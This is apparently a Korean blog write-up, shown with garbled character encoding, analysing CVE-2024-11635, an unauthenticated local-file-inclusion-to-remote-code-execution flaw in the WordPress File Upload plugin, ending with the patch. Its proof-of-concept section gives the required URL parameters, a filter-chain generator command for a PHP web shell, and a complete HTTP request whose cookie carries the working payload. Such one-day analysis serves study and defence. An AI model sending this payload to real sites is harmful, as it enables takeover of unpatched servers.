---
title: "[CVE-2024-11635] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "Wordpress file upload plugin 4.24.12 ë²„ì „ ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” RCE ì·¨ì•½ì "
author: dottak
date: 2025-02-10 16:04:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, WordPress, WordPress Plugin, CVE, CVE-2024-11635]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ğŸ“Œ Analysis

### 1. ê°œìš”

WordPress File Upload í”ŒëŸ¬ê·¸ì¸ì€ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ëŠ” Short Code í¼ì„ ì œê³µí•˜ê³  ì—…ë¡œë“œëœ íŒŒì¼ì„ ê´€ë¦¬í•  ìˆ˜ ìˆë„ë¡ ë„ì™€ì£¼ëŠ” í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤. ì´ í”ŒëŸ¬ê·¸ì¸ì˜ 4.24.12 ë²„ì „ ì´í•˜ì—ì„œëŠ” íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ìš”ì²­í•  ë•Œ, ì¿ í‚¤ `wfu_ABSPATH` ë¥¼ ì‚¬ìš©í•˜ë©°, í•´ë‹¹ ê°’ì´ `include` í•¨ìˆ˜ë¡œ ì „ë‹¬ë˜ì–´ RCE(Remote Code Execution) ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.

### 2. ì·¨ì•½ì  ë¶„ì„

WordPress File Upload í”ŒëŸ¬ê·¸ì¸ì€ ì—…ë¡œë“œ í¼(ë‹¨ì¶•ì½”ë“œ, `[wordpress_file_upload]`)ì„ ì´ìš©í•˜ì—¬ ì—…ë¡œë“œëœ íŒŒì¼ ëª©ë¡ì€ Uploaded Files ë¼ëŠ” ëŒ€ì‹œë³´ë“œ ë©”ë‰´(`/wp-admin/admin.php?page=wfu_uploaded_files`)ì—ì„œ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì—…ë¡œë“œëœ íŒŒì¼ì€ ë‹¤ìš´ë¡œë“œ ê¸°ëŠ¥ì„ ì œê³µí•˜ë©° Actions íƒ­ì˜ ë‹¤ìš´ë¡œë“œ ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-001.png)

ìœ„ ë‹¤ìš´ë¡œë“œ ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ HTTP íŒ¨í‚· ìš”ì²­ì´ ë°œìƒë˜ë©°, ì´í›„ `/wp-content/plugins/wp-file/upload/wfu_file_downloader.php` ë¥¼ ìš”ì²­í•˜ì—¬ ë‹¤ìš´ë¡œë“œ í•˜ë ¤ëŠ” íŒŒì¼ì˜ ë°ì´í„°ë¥¼ ë‚´ë ¤ë°›ê²Œ ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-002.png)

`/wp-content/plugins/wp-file/upload/wfu_file_download.php` íŒŒì¼ì€ ìš”ì²­ ì‹œ ë³€ìˆ˜ ì´ˆê¸°í™” ê³¼ì • ì´í›„ì— í•¨ìˆ˜`wfu_download_file` ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-003.png)

í•¨ìˆ˜ `wfu_download_file` ëŠ” ì²˜ë¦¬ ê³¼ì •ì—ì„œ ë‹¤ì‹œ `wfu_update_download_statsu` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ë‹¤ìš´ë¡œë“œ ìƒíƒœë¥¼ ì €ì¥í•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-004.png)

ì´ë•Œ, í˜¸ì¶œëœ `wfu_update_download_statsu` í•¨ìˆ˜ì˜ êµ¬í˜„ ë¡œì§ì—ì„œ í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ ê°’ ì¤‘ Cookie `wfu_ABSPATH` ë¥¼ ë¬¸ìì—´ `wp-laod.php` ì™€ ê²°í•©í•˜ì—¬ í•¨ìˆ˜`require_once` ë¡œ ì „ë‹¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```php
function wfu_update_download_status($ticket, $new_status) {
	require_once WFU_USVAR_downloader('wfu_ABSPATH').'wp-load.php'; // <- Here
	WFU_USVAR_store('wfu_download_status_'.$ticket, $new_status);
}
```

ì¦‰, í•´ë‹¹ ìœ„ì¹˜ì—ì„œ ì‚¬ìš©ìë¡œë¶€í„° ì „ë‹¬ëœ ë°ì´í„°ê°€ `require_once` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì–´ LFI(Local File Inclusion) ì·¨ì•½ì ì´ ë°œìƒë  ìˆ˜ ìˆê³  ì´ LFI ì·¨ì•½ì ì„ í†µí•´ RCE ì·¨ì•½ì (LFI2RCE)ìœ¼ë¡œ í™•ëŒ€ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> `require_once` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ëœ `wfu_ABSPATH` ì¿ í‚¤ ê°’ì€ `wp-load.php` ì™€ ê²°í•©ë˜ëŠ”ë° ì´ëŠ” `PHP Filter Chain` ê¸°ë²•ì„ ì´ìš©í•˜ì—¬ ê·¸ ì¤‘ `php://temp` ìŠ¤íŠ¸ë¦¼ ì „ë‹¬ì„ í†µí•´ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
> 

ë˜í•œ, `/wp-content/plugins/wp-file/upload/wfu_file_download.php` ìš”ì²­ ì‹œ, ì²˜ë¦¬ ê³¼ì •ì—ì„œ ì‚¬ìš©ì ì ‘ê·¼ ì œí•œì„ ê²€ì‚¬í•˜ê³  ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. 

## ğŸ“Œ PoC

### 1. ìš”ì²­ ë°ì´í„° í™•ì¸

`/wp-content/plugins/wp-file/upload/wfu_file_download.php` ë¥¼ ìš”ì²­í•  ë•Œ, ì²˜ë¦¬ ê³¼ì •ì—ì„œ í•„ìš”í•œ ë°ì´í„°ê°€ ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš° `die` í•¨ìˆ˜ë¥¼ í†µí•´ ì²˜ë¦¬ê°€ ì¢…ë£Œë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-005.png)

ë”°ë¼ì„œ, ì·¨ì•½ì ì´ ë°œìƒí–ˆë˜ í•¨ìˆ˜ `wfu_update_download_status` ê°€ í˜¸ì¶œë˜ë„ë¡ URL íŒŒë¼ë¯¸í„°ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì „ë‹¬í•©ë‹ˆë‹¤.

> URL íŒŒë¼ë¯¸í„° `handler` ì™€ `dboption_base` ëŠ” ê°ê° `dboption`, `cookies` ë¡œ ì§€ì •í•´ì•¼ í•œë‹¤.
> 

```php
/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?handler=dboption&dboption_base=cookies&file=FOO&ticket=FOO&session_legacy=FOO&dboption_useold=FOO&wfu_cookie=FOO
```

![image](assets/posts/one-day/2025-02-10/image-006.png)

### 2. PHP ì•…ì„± ì½”ë“œ ì‘ì„±(PHP Filter Chain)

Python ê¸°ë°˜ì˜ PHP Filter Chain ë„êµ¬ì¸ [PHP Filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ ì‰˜ ì½”ë“œ `<?php system($_GET['cmd']);?>` ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

```php
python3 php_filter_chain_generator.py --chain "<?php system(\$_GET['cmd'])?>"
```

![image](assets/posts/one-day/2025-02-10/image-007.png)

### 3. ìµìŠ¤í”Œë¡œì‡

PHP í•„í„° ì²´ì¸ ê¸°ë²•ì„ í†µí•´ ìƒì„±í•œ ê°’ì„ ì¿ í‚¤ `wfu_ABSPATH` ì— ì„¤ì •í•˜ê³  URL íŒŒë¼ë¯¸í„° `cmd` ì— ì„ì˜ì˜ ëª…ë ¹ì–´(`id`) ë¥¼ ì¶”ê°€í•˜ì—¬ ìš”ì²­í•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2025-02-10/image-008.png)

ê²°ê³¼ì ìœ¼ë¡œ, PHP Filter Chain ê¸°ë²•ì„ ì´ìš©í•˜ì—¬ ì…ë ¥í•œ ì›¹ ì‰˜ ì½”ë“œ(`<?php system($_GET['cmd']);?>`)ê°€ ì¿ í‚¤ `wfu_ABSPATH` ë¡œ ì „ë‹¬ë˜ì—ˆê³ , ì´ ì¿ í‚¤ ê°’ì´ `require_once` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì–´ ì„ì˜ì˜ ëª…ë ¹ì–´ `id` ê°€ ì‹¤í–‰ëœ ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 4. PoC ì½”ë“œ: HTTP Request Packet

```
GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=FOO&ticket=FOO&handler=dboption&session_legacy=FOO&dboption_base=cookies&dboption_useold=FOO&wfu_cookie=FOO&cmd=id HTTP/1.1
Host: localhost:8080
Cookie: wfu_ABSPATH=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp;
```

## ğŸ“Œ íŒ¨ì¹˜ í™•ì¸

íŒ¨ì¹˜ëœ ë²„ì „ì—ì„œëŠ” ì¿ í‚¤ `wfu_ABSPATH` ì— ì…ë ¥ëœ ê°’ì´ `require_once` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì§€ ì•Šë„ë¡ ì „ì—­ ë³€ìˆ˜ `wfu_downloader_data` ë¡œ ë¶€í„° ê°’ì„ ê°€ì ¸ì˜¤ë„ë¡ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤.

> https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3188858%40wp-file-upload&old=3164451%40wp-file-upload&sfp_email=&sfph_mail=#file173
> 

![image](assets/posts/one-day/2025-02-10/image-009.png)